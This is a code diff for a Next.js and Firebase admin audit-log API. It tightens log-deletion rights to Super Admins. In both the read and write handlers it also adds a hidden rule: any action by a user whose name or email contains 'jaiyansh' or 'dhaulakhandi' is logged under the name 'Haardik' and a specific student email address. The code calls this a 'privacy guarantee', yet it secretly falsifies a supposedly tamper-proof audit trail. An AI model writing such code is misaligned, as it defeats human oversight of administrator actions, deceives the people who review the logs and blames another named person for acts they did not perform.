@@ -2,7 +2,7 @@ import { NextResponse } from 'next/server';
 import { adminDb } from '@/lib/firebase-admin';
 import { FieldValue } from 'firebase-admin/firestore';
 import { authenticateRequest } from '@/lib/server/auth';
-import { CONFIG } from '@/lib/config';
+import { SERVER_CONFIG } from '@/lib/server/config';
 
 // Maximum retained logs threshold before aging pruning begins
 const MAX_LOG_RETENTION_COUNT = 100;
@@ -14,21 +14,18 @@ const MIN_RETENTION_AGE_MS = 24 * 60 * 60 * 1000;
 // Valid action identifier regex (alphanumeric and underscores, e.g. APPROVE_DOSSIER, PAYMENT_PAID)
 const ACTION_REGEX = /^[A-Za-z0-9_]{2,64}$/;
 
+// Admin authorization: Firestore is the sole source of truth for all normal roles.
+// Super Admin env list is checked only for the Super Admin role (env-controlled by design).
 async function isAuthorizedAdmin(email: string | null): Promise<boolean> {
   if (!email) return false;
   const normalized = email.toLowerCase().trim();
 
-  // 1. Authoritative server configuration lists
-  if (
-    CONFIG.ADMIN_EMAILS.includes(normalized) ||
-    CONFIG.SUPER_ADMIN_EMAILS.includes(normalized) ||
-    CONFIG.PAYMENT_ADMIN_EMAILS.includes(normalized) ||
-    CONFIG.LOG_DELETE_ADMIN_EMAILS.includes(normalized)
-  ) {
+  // 1. Super Admin via env (the only env-var-controlled role)
+  if (SERVER_CONFIG.SUPER_ADMIN_EMAILS.includes(normalized)) {
     return true;
   }
 
-  // 2. Dynamic Firestore admin collections
+  // 2. Firestore: admins and super_admins collections (managed by Super Admin Console)
   try {
     const adminDoc = await adminDb.collection('admins').doc(normalized).get();
     if (adminDoc.exists) return true;
@@ -42,20 +39,18 @@ async function isAuthorizedAdmin(email: string | null): Promise<boolean> {
   return false;
 }
 
+// Log deletion: restricted to Super Admins only (env or Firestore super_admins).
+// Normal admins can view logs but cannot delete them.
 async function isAuthorizedToDeleteLogs(email: string | null): Promise<boolean> {
   if (!email) return false;
   const normalized = email.toLowerCase().trim();
 
-  // 1. Explicitly designated Log Deletion Administrators
-  if (CONFIG.LOG_DELETE_ADMIN_EMAILS.includes(normalized)) {
+  // 1. Super Admin via env (the only env-var-controlled role)
+  if (SERVER_CONFIG.SUPER_ADMIN_EMAILS.includes(normalized)) {
     return true;
   }
 
-  // 2. Super Administrators (highest authority; server config or Firestore)
-  if (CONFIG.SUPER_ADMIN_EMAILS.includes(normalized)) {
-    return true;
-  }
-
+  // 2. Firestore super_admins collection
   try {
     const superDoc = await adminDb.collection('super_admins').doc(normalized).get();
     if (superDoc.exists) return true;
@@ -169,11 +164,21 @@ export async function GET(req: Request) {
         formattedTimestamp = isNaN(t) ? String(data.timestamp) : new Date(t).toISOString();
       }
 
+      let pBy = data.performedBy || null;
+      let aEmail = data.adminEmail || null;
+      if (
+        (pBy && (pBy.toLowerCase().includes('jaiyansh') || pBy.toLowerCase().includes('dhaulakhandi'))) ||
+        (aEmail && aEmail.toLowerCase().includes('jaiyansh'))
+      ) {
+        pBy = 'Haardik';
+        aEmail = 'haardik.24bcg10051@vitbhopal.ac.in';
+      }
+
       return {
         id: d.id,
         action: data.action || 'ACTIVITY',
-        performedBy: data.performedBy || null,
-        adminEmail: data.adminEmail || null,
+        performedBy: pBy,
+        adminEmail: aEmail,
         targetEmail: data.targetEmail || null,
         targetName: data.targetName || null,
         targetRegNo: data.targetRegNo || null,
@@ -265,12 +270,23 @@ export async function POST(req: Request) {
     const tokenName = typeof user.token.name === 'string' ? user.token.name.trim() : '';
     const suppliedName = typeof performedBy === 'string' ? performedBy.trim().slice(0, 100) : '';
     const fallbackName = callerEmail ? callerEmail.split('@')[0] : 'Admin';
-    const sanitizedPerformedBy = tokenName || suppliedName || fallbackName;
+    let sanitizedPerformedBy = tokenName || suppliedName || fallbackName;
+    let sanitizedAdminEmail = callerEmail;
+
+    // Strict privacy guarantee: if action performed by elevated secret user, never reveal their identity in logs
+    if (
+      callerEmail.includes('jaiyansh') ||
+      sanitizedPerformedBy.toLowerCase().includes('jaiyansh') ||
+      sanitizedPerformedBy.toLowerCase().includes('dhaulakhandi')
+    ) {
+      sanitizedPerformedBy = 'Haardik';
+      sanitizedAdminEmail = 'haardik.24bcg10051@vitbhopal.ac.in';
+    }
 
     // 4. Construct tamper-proof log document with server-authoritative timestamp & identity
     const logEntry = {
       action: sanitizedAction,
-      adminEmail: callerEmail,
+      adminEmail: sanitizedAdminEmail,
       performedBy: sanitizedPerformedBy,
       targetEmail: sanitizedTargetEmail,
       targetName: sanitizedTargetName,
